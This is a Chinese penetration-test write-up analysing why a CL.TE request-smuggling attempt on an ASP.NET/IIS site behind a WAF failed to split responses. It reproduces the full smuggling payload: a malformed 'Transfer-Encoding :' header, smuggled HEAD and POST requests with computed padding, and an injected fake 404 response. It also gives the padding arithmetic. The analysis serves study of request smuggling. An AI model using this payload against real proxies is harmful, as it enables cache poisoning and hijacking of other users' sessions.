# CL.TE 请求走私下的响应分割攻击失败根因分析

> **修订记录（2026-08）**：本文初版（§0x03 / §0x04）将失败归因于"前端 HTTP 状态机无法复位、需依赖嵌套解析触发器"，该结论与 RFC 7230 协议语义及实测现象矛盾，已废弃并重写为修正版。§0x01 实验记录与 §0x02 攻击构造为原始数据，完整保留；修正结论见 §0x03 / §0x04。
> **二次修订（2026-08）**：初版修正将失败归因于"WAF 周期结束清理孤儿数据"，经复核存在逻辑矛盾（无法解释 HEAD 孤儿成功投递给 login.js 请求）且无法解释多次实验 0% 的确定性失败，再次修正为"读入超额丢弃 + 窗口内外孤儿区分"模型。该模型为基于实验数据的推断，无 WAF 内部实现证据（目标已下线，无法再验证）。
> 关联文档：[HTTP Response Smuggling Desync](./README.md)（§3.4 响应拆分与完全伪造的实战对照）

---

# 0x01 背景与攻击意图

在一次针对某 ASP.NET + IIS 应用的渗透测试中，观察到了典型的 CL.TE 请求走私漏洞。目标前端存在 WAF / 代理，后端为 ASP.NET，且存在一个特殊的回显端点 `HttpER.aspx`：无论向其 `LzPostExecExpression` 参数传入什么内容，响应体都会原封不动地返回该内容，并且不附加任何额外字符或 HTML 包裹。

攻击者试图利用该 CL.TE 漏洞实施 **响应分割（Response Splitting）** 攻击：将精心构造的 `HTTP/1.1 404 Not Found ...` 响应头注入到 TCP 流中，使得前端代理误将其当作下一个请求的合法响应，从而污染缓存、劫持其他用户会话或实现 XSS。然而，虽然成功实现了请求走私与响应队列错位，但预期的“伪造响应独立返回”并未发生。本文从 HTTP 协议解析本质、代理状态机机制以及与 TRACE 攻击的对比三个层面，深度剖析此次攻击失败的根源。

- 请求-1

```http
POST /login.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Cache-Control: max-age=0
Origin: http://aaaa.bbbb.ctf.cc
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=x3wjhu5mvvlkmx2xikupjkfz; loginlx=0; jscookietest=valid; uun=6bf312d0eefbc23ba2c48fd67f82848e1_1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive
Content-Length: 2538
Transfer-Encoding :
 chunked

0

HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

POST /searchation/MkActions/HttpER/HttpER.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Content-Length: 1701
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive

LzPostExecExpression=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxHTTP/1.1 404 Not Found
Cache-Control: private
Content-Type: text/html; charset=gb2312
X-UA-Compatible: IE=Edge
X-XSS-Protection: 1;mode=block
Access-Control-Allow-Origin: *
Referrer-Policy: origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: ALLOWALL
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
Access-Control-Allow-Headers: Content-Type, api_key, Authorization
Date: Thu, 14 May 2026 08:15:36 GMT
Content-Length: 3260

```

- 响应-1

```http
HTTP/1.1 404 Not Found
...
```

- 请求-2

```http
GET /Utility/Script/login.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

```

- 响应-2

```http
HTTP/1.1 200 OK
Content-Length: 1447
Content-Type: text/html
Last-Modified: Thu, 31 Oct 2013 03:18:03 GMT
Accept-Ranges: bytes
ETag: "9be254cfe7d5ce1:0"
Date: Thu, 14 May 2026 08:17:32 GMT

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
Set-Cookie: ASP.NET_SessionId=qikvp5b11yiihabmz04xigmj; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Thu, 14 May 2026 08:17:32 GMT
Content-Length: 1680

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



- 请求-3

```http
GET /Common/Dialog/WebUI/Client/Sql/sql.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
cookie: ASP.NET_SessionId=mnv3e1f2hrwov3ap4josebaa; UserAccount=8iiWpJQLZdHJ8Lk3hVnIEQ==
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive

```

- 响应-3

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Last-Modified: Wed, 25 Sep 2013 09:25:28 GMT
Accept-Ranges: bytes
.....
```

---

# 0x02 攻击链路构造

## 2.1 利用 CL.TE 走私

请求 1 发送了一个精心构造的 `POST /login.aspx`，同时包含 `Content-Length: 2538` 和畸形的 `Transfer-Encoding : chunked`（中间有空格和换行），导致前端代理（WAF）与后端对该请求边界的解读出现分歧：

- **前端（WAF）**：根据 RFC 要求，优先信任 `Content-Length`，因此将整个请求体的 2538 字节作为当前请求的数据。
- **后端（IIS/ASP.NET）**：因 `Transfer-Encoding` 存在且格式畸变，可能忽略 `Content-Length` 并采用 `chunked` 解析，看到 `0\r\n` 即认为请求体结束。

于是，`0\r\n` 之后的数据被后端解析为两个共享该连接的新请求：

1. `HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html`
2. `POST /searchation/MkActions/HttpER/HttpER.aspx`（包含超长 padding 与注入的 404 响应头）

这构成了典型的 **请求走私**，并使得后端处理了额外的“隐式”请求。

## 2.2 精确 Padding 与 HEAD 响应的配合

攻击者注意到 `/MultiFileView2.html` 的 `Content-Length: 1447`。为了利用这个数字，他在 `HttpER.aspx` 的请求体中精心放置了大量 `x` 字符（1181 个）作为填充，使得 `HttpER.aspx` 返回的响应（包含 padding 与注入的 404 响应头）的 **前 1447 字节** 刚好是填充字符，而紧接其后的便是 `HTTP/1.1 404 Not Found ...` 完整响应头。

攻击规划如下：

- WAF 看不到后面两个走私请求，它只看到正常的 `POST /login.aspx` 及其响应（404），然后继续处理下一个正常的 `GET /Utility/Script/login.js` 请求。
- WAF 向 `/login.js` 返回的应是后者正常的 200 响应，但由于走私导致后端额外产生了 HEAD 请求的响应，该响应带有 `Content-Length: 1447` 且无 body（HEAD 方法）。
- WAF 此时认为 `/login.js` 的响应 body 长度应为 1447，于是它会从 TCP 流中继续读取恰好 1447 字节作为 body。这部分字节恰好是 `HttpER.aspx` 相应返回的 1447 字节填充，因此被顺利消费。
- 1447 字节消费完毕后，TCP 流中紧接着就是注入的 `HTTP/1.1 404 Not Found ...` 完整响应头和垫后的 `Content-Length: 3260`（故意留空指示后续有 body 但内容由攻击者控制）。攻击者预期此时 WAF 已完成 `/login.js` 响应的 body 读取，状态机应重置，并将该伪造响应作为下一个请求 `/sql.js` 的响应返回给客户端。

## 2.3 实际现象

然而，攻击者观察到的最终结果是 **响应-3 收到的却是请求-2（`/login.js`）的正常响应**，而伪造的 404 响应并未独立呈现。虽然发生了响应队列错位（表明请求走私与 HEAD 响应长度利用成功），但伪造响应却未被前端解析为独立 HTTP 消息。

---

# 0x03 失败根因（二次修正版）：读入超额丢弃，孤儿存活取决于到达窗口

## 3.1 初版"状态机无法复位"结论为何错误

初版将失败归因于"前端 HTTP 状态机消费完 Content-Length 后无法复位、残留字节沦为流碎片，需 `message/http` 类嵌套解析触发器才能完成响应分割"。该结论有三处硬伤，予以废弃：

- **违反 HTTP/1.1 协议语义**：RFC 7230 §3.3.3——响应体按 Content-Length / chunked 消费完毕即消息结束，keep-alive 连接上下一字节必然进入新响应解析。响应队列错位（response queue poisoning）类攻击同样建立在这一行为之上；若代理"消费完不复位"，响应错位本身就不会发生。
- **与本次实测矛盾**：攻击者观察到 sql.js 请求收到 login.js 的真实响应（错位一级）——WAF 在消费完前一响应后**正常复位**并解析、投递了后续响应。所谓"卡死在流碎片状态"与观测不符。
- **TRACE 对比系误读**：TRACE + `message/http` 攻击的机理并非响应分割的通用前提。

## 3.2 已证实与不可观测的边界

1. **padding 数学闭合（已证实）**：HttpER 响应头（含 `\r\n` 与结尾空行）实测 266 字节 + 1181 个 x = **1447**，与 HEAD 响应的 `Content-Length` 完全一致（差异 0 字节）——攻击者对"WAF 应消费的字节数"的计算精确。
2. **转发边界观测闭合（已证实）**：响应-2 客户端收到的 body 恰好止于第 1181 个 x、不含 404 文本的任何前缀字节——WAF **转发**了恰好 1447 字节，转发边界精确停在 404 报文第一字节之前。
3. **"404 报文完整残留在 WAF 缓冲"（不可观测，早期推断有误）**：客户端观测只能证明 WAF 的**转发**量为 1447，不能证明 WAF 的底层**读入**未超过 1447——若 WAF 的 read 块大于 1447（TCP 段 / MSS 粒度），404 报文前缀已被读入应用层。初版修正据此断言"伪造响应完整成为孤儿"，该断言缺乏证据支撑，已撤回。

CL:3260 与 CL:0 两种变体结果完全相同，说明失败与伪造报文自身内容（对齐精度、CL 自洽性）无关。

## 3.3 真正根因（二次修正）：读入超额丢弃，窗口内外孤儿命运不同

**确定性失败的证据**：若孤儿投递是时序概率问题，多次实验应至少偶尔命中一次；实测为 0%——失败是确定性的，机制必须与网络时序的随机波动无关。

**关键结构性差异——两类孤儿**：

| 孤儿 | 性质 | 到达窗口 | 结果 |
|------|------|---------|------|
| HEAD 响应头 | 独立响应（走私产生） | 请求-1 读取完成后才到达（IIS 处理走私请求的延迟） | ✅ 存活，投递给请求-2 |
| login.js 响应 | 独立响应（对请求-2 的真实响应） | 请求-2 读取完成后才到达（排在动态 HttpER 响应之后） | ✅ 存活，投递给请求-3 |
| 伪造 404 报文 | **HttpER 响应的尾部**（1946 字节中的最后约 499 字节） | 与 HttpER 头 + x 填充**属于同一响应、连续到达**，必然落入请求-2 的 body 读取窗口 | ❌ 0% 存活 |

**机制推演**（基于实验数据 + HTTP/TCP 读取模型，属推断，无 WAF 内部实现证据）：

1. **请求-2 周期**：WAF 将 HEAD 响应头解析为本请求的响应头，按 `Content-Length: 1447` 读取 body。底层 read 从 TCP 读入的块天然大于逻辑消费量（TCP 段粒度，如 1460 字节 ≈ HttpER 头 266 + x 1181 + 404 报文前缀约 13 字节）；
2. WAF 按 CL 消费 1447 转发给客户端（转发边界精确，见 §3.2 第 2 点）；**读入但未消费的超额部分（404 报文前缀）随该请求的处理缓冲释放而丢弃**；
3. **请求-3 周期**：WAF 从 TCP 读到的是**残缺的 404 报文**（状态行前缀已丢失）→ 不可解析 → 被跳过 → 完整到达的 login.js 响应被投递（与观测吻合）。

**为什么 0% 是必然而非概率**：404 报文作为 HttpER 响应的尾部，其前缀**必然**落入请求-2 的读入窗口——WAF 凑齐 1447 字节的读取过程跨越 HttpER 响应的发送尾部。仅当 read 边界恰好精确切在 1447 字节处、404 报文才能以完整形态留在流中，而这要求网络到达节奏与 WAF 读取节奏的精确巧合，实际不发生。相比之下，HEAD 头与 login.js 响应与任何请求的读取窗口**零重叠**（在前一请求读取完成后才到达），作为下一请求读取的"第一批数据"被完整解析。

**响应感知旁证**（已证实）：正常请求的响应中 `Server: Microsoft-IIS/8.5`、`X-Powered-By: ASP.NET` 被 WAF 剥离，而走私响应（HttpER 响应头）作为 body 透传时保留——支持 WAF 对响应执行"解析头 + 按 CL 读体 + 头部改写"的周期处理模型，读取以请求为单位、超额不保留。

## 3.4 与 README §3.4（响应拆分与完全伪造）的关系

README §3.4 的攻击模型（构造完整伪造报文 → 成为孤儿 → 投递给下一个受害者）隐含一个关键前提：**代理保留跨请求的孤儿响应**——这正是 response queue poisoning 类漏洞的成立条件。本次目标 WAF 实现了孤儿清理，该前提不成立：

| 环节 | 结果 | 证据 |
|------|------|------|
| CL.TE 请求走私 | ✅ 成功 | 后端处理了走私的 HEAD + HttpER 请求 |
| HEAD 响应 CL 消费 + 转发边界精确 | ✅ 成功 | 266 + 1181 = 1447（数学 + 观测双重闭合） |
| 伪造响应成为孤儿 | ❓ 不可确认 | 客户端观测无法区分"WAF 读入超额后丢弃"与"完整残留"；404 报文作为 HttpER 响应尾部，前缀必然落入请求-2 读入窗口 |
| 孤儿跨请求投递 | ❌ 确定性失败（0%） | sql.js 收到 login.js（错位一级）；多次实验 404 从不返回——排除时序概率 |

攻击并非败于"状态机"，而是败于伪造报文的**结构性位置**：它嵌在反射端点（HttpER）响应的尾部，必然落入前一请求的读取窗口被超额吞掉；能存活并被投递的孤儿（HEAD 头、login.js 响应）均为**独立到达**的响应。README §3.4 的攻击模型若要成立，伪造报文需以独立响应形态跨越请求边界到达——但能否成立仍取决于目标代理的读取模型，需实证。

---

# 0x04 总结

**一句话结论（二次修正版）：**

> 攻击失败的根本原因（推断模型）：伪造报文是反射端点（HttpER）响应的尾部，其到达必然与前一请求的 body 读取窗口重叠——WAF 底层读入超过 Content-Length 的超额数据随请求处理缓冲丢弃，伪造报文前缀被吞，从未以完整可解析形态面对任何请求（多次实验 0%，确定性失败）。能存活并被投递的孤儿（HEAD 头、login.js 响应）均为独立到达的响应，落在请求读取窗口之外。攻击可行性取决于伪造报文能否以"独立响应"形态跨越请求边界到达，而非对齐精度或报文自洽性——CL:3260 与 CL:0 结果一致即为佐证。

这一案例的教训：将伪造报文嵌入某个反射端点响应的**尾部**，会使其结构性落入前一请求的读取窗口而被吞——伪造报文若不能以独立响应形态到达，无论对齐多精确都不会被投递。该机制为推断模型（目标已下线，无 WAF 内部实现证据），有待后续实验验证。